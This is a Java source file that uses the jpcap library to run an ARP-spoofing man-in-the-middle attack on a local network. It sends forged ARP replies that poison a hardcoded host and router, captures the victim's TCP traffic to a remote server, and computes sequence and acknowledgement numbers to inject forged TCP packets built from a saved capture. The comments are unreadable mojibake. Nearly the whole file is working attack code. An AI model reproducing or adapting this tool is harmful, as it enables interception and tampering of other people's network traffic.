package Manager;


import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.TCPPacket;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_1 {
	
	static Model_Capture cpmodel = new Model_Capture();
	static List<TCPPacket> cpmodels = new ArrayList<TCPPacket>();
	
	//��3��LIST����װҪ���͵İ� ARP  TCPtohost  TCPtoservice
	
	static List<ARPPacket> ARPs = new ArrayList<ARPPacket>();
	static List<TCPPacket> TCPtohosts = new ArrayList<TCPPacket>();
	static List<TCPPacket> TCPtoservices = new ArrayList<TCPPacket>();
	
	
	/*static Thread capThread = null;
	static Thread senThread = null;
	static Thread fakeThread = null;*/
		
	public static void main(String[] args) {
		
		//��ȡ�������ݰ�������
		JpcapSender js = getCrad(0);
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/
		setARPs("192.168.8.100","192.168.8.1");
		
		
		/*************************************************
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
		sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		capPacket_run(0,"192.168.8.100","119.29.42.117");
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		//fakeThread(2);
		
	}
	
	
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP
	 *************************************************/
	public static void capPacket_run(int i,String host_ip, String service_ip){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        startCapThread(jpcap,host_ip,service_ip);    
	        System.out.println("��ʼץȡ��"+i+"�������ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	    //��Captor�ŵ������߳�������    
	   public static void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip ){    
	       //JpcapCaptor jp=jpcap;    
	       java.lang.Runnable rnner=new Runnable(){      

			public void run(){    
	               //ʹ�ýӰ�������ѭ��ץ��-1��ʾ�����Ƶ�ץȡ���ݰ�   "192.168.8.101","119.29.42.117"
				
	        	   while(true){
	        		  TestPacketReceiver pr = new TestPacketReceiver(host_ip,"E4:D3:32:E0:7B:82");
	        		  jpcap.loopPacket(1, pr);
	        		  
	        		  //�õ�ץȡ���ģ�ָ����TCPmodel ��Ҫ��model�е����ݽ��з����ͼ��㲢�ҰѼ�������ݷ��س��߳�
	        		  if(pr.getModel() != null){
	        			  
	        			  //��ͬ����??
	        			  if(pr.getModel().getFlag().equals("syn")){
	        				  
	        				  System.out.println("����֡......����cpmodelʧ��");
	        				  continue;
	        			  }
	        			  
	        			  
	        			  //��סcapmodel
	        			  synchronized (cpmodel) {
	        				  
	        				  
	        				  if(cpmodel.getAcknum() == 0){
		        				  
		        				  cpmodel =  pr.getModel();	
		        				  System.out.println("cpmodel��ʼ��");
		        				  
		        				  TCPPacket fakeTCP = null;
		        				  fakeTCP = fakeTCP(cpmodel);
		        				  if(fakeTCP != null){ 
		        					  System.out.println("��ȡ��α������");
									   //��ס����װTCP��list
									  synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("����α�����ݷ��Ͷ���.."); 
							
										
									//����α���߳�
									//cpmodel.notifyAll();
									  }   
								  }
		        				  
		        				  
		        			  }  
		        			  //��֮ǰ�Ĳ�ͬ����ӽ�ȥ
		        			  else if(cpmodel.getAcknum() != 0 && !cpmodel.issame(pr.getModel())){	  
		        				 

	        					  cpmodel =  pr.getModel();	
	        					  System.out.println("cpmodel����");
	        					  
	        					  
		        				  TCPPacket fakeTCP = null;
		        				  fakeTCP = fakeTCP(cpmodel);
		        				  if(fakeTCP != null){ 
		        					  System.out.println("��ȡ��α������");
									   //��ס����װTCP��list
									  synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("����α�����ݷ��Ͷ���.."); 
							
							
							
									//����α���߳�
									//cpmodel.notifyAll();
									//System.out.println("��α���߳�......");
									  }  
								   }
		        				  
		        			  }
	        				  
	        				 /* try {
	        					  //this?
	        					System.out.println("ֹͣץ���߳�......");
								cpmodel.wait();
								
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						}
						
	        			
	        		  } 
	        	   }    
	           }    
	       }; 
	       

			Thread capThread = new Thread(rnner);
			capThread.start();
	      // new Thread(rnner).start();//����ץ���߳�    
	       System.out.println("ץ���߳�����");
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   
	 /*************************************************
	 * �����߳�
	 *************************************************/
	   public static void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						
						//��ͣ�ķ���
						while(true){
							if(js != null){
								//���LIST��Ϊ�գ��ͷ���LIST����ı���
								if(ARPs.size()!= 0){
									
									for(int i= 0 ;i<ARPs.size();i++){	
										js.sendPacket(ARPs.get(i));
										System.out.println("sending arp.."); 
									}	
								}
								
								synchronized (TCPtohosts) {
									if(TCPtohosts.size()!= 0){
										for(int i= 0 ;i<TCPtohosts.size();i++){	
											js.sendPacket(TCPtohosts.get(i));
										System.out.println("sending TCPtohost.."+"seq|"+TCPtohosts.get(i).sequence+" ack|"+TCPtohosts.get(i).ack_num); 
										}	
										
										//�������֮����գ�ֻ����һ��
										TCPtohosts.clear();
									}
								}
								
								
								synchronized (TCPtoservices) {
									if(TCPtoservices.size()!= 0){
										for(int i= 0 ;i<TCPtoservices.size();i++){	
											js.sendPacket(TCPtoservices.get(i));
											System.out.println("sending TCPtohost.."+"seq|"+TCPtoservices.get(i).sequence+" ack|"+TCPtoservices.get(i).ack_num);
										}
										TCPtoservices.clear();
									}
									
								}
							}
							//this.wait(10000);
							Thread.sleep(10000);
						}
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			
			//new Thread(runner).start();
		   System.out.println("�����߳�����");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs����
	 *************************************************/
	   public static void setARPs(String hostIP,String routeIP){
		   SetARP sa = new SetARP();
		   
		  ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,"AC-CF-23-87-BD-2E","60-D8-19-4A-B2-FC");
		  ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,"E4-D3-32-E0-7B-82","60-D8-19-4A-B2-FC");
		  
		  ARPs.add(arp1);
		  ARPs.add(arp2); 
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	  /*************************************************
	 * α�����ݰ��߳�,��Ϊ����ģʽ
	 *************************************************/
	  public static void fakeThread(int flag){
		   
		   //ģʽһΪֱ��ת�����յ�������

		   //ģʽ2Ϊ���ضԷ�����,ת���Լ�α�������
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					   System.out.println("���뵽α���߳�1");
					   
					  while(true){
						  
						  
						  	synchronized (cpmodel) {
							  
							/*  try {
								  System.out.println("α���̵߳ȴ���......");
								cpmodel.wait();
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						 // }
						  	
						  	
						  	
						    
						  if(cpmodel != null){
							   //synchronized (cpmodel) {
								 //�����α������ݰ�,����һ��TCPpcaket
							  System.out.println("��ʼα�����ݰ�......");
							  
								   TCPPacket fakeTCP = fakeTCP(cpmodel);
								   System.out.println("���ʵ�cpmodel1");
								   if(fakeTCP != null){ 
									   System.out.println("���ʵ�cpmodel2");
									   //��ס����װTCP��list
									  // synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("����α�����ݷ��Ͷ���.."); 
										//����ֻ����һ�ξ�Break��
										//break;
									 // }   
								   }
								
							//}  
						  } 
						  
						  
						  //��������ץ��
						  //synchronized (cpmodel) {
							  
							 /* try {
								  System.out.println("���´�ץ���߳�......");
								cpmodel.notifyAll();;
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						  }
						  
						 
					  
					 }
					
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.setPriority(7);
			   fakeThread.start();
			   System.out.println("����α���߳�......");
			  //  new Thread(runner).setPriority(10).start();
		   //}
		    
	   }
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   /*************************************************
	 * ����α�����Ҫ���͵�TCP֡
	 *************************************************/
	   public static TCPPacket fakeTCP(Model_Capture cpmodel){
		  
		   
		   //���õ�Ҫα������ݶ�
		   Manager_airdump ma = new Manager_airdump();
		   
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   
		   //��������������
		   if(!cpmodel.isTransation()&&cpmodel!=null){
			   
			   //������Ҫα���������α��Ϊ����������������
			   //�ȼ����seq ack
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				    if(cpmodels.size() == 0){
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   }
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //����SEQ��ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   if(cpmodels.size() < 3&&seq != 0){
				   
				   int index = cpmodels.size();
				   if(index == 2)
					   index++;
				   
				  Model_a model= ma.run("1122.pcap","192.168.8.100").get(index);
				   
				  tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
		    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
		    			 "60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", model);
System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);  
			   }
			   else if(cpmodels.size() >=3&&seq != 0){
				   
				   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
			    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
			    			 "60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", null);
	System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.len);
				   
			   }
			   //����Ϊզ����   
		   }
		   
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	
	   
	   
	   /*************************************************
		 * ����ARP���߳�
		 *************************************************/
		/*public  static void ARPthread(final JpcapSender js){
			
			
			final SentARP sa = new SentARP();
			java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						sa.run_ARP(js,"192.168.8.101","192.168.8.1","AC-CF-23-87-BD-2E","60-D8-19-4A-B2-FC");
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			new Thread(runner).start();
		}*/
		

		
		/*************************************************
		 * end
		 *************************************************/
		
		 /*************************************************
			 * ��ȡ�����������ݵ�����
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					
					 try{    
						 //��ȡ�����ϵ�����ӿڶ�������    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("������ȡ�ɹ�  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
					} catch (IOException e1) {
			System.out.println("JSender�������ɹ�");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
}    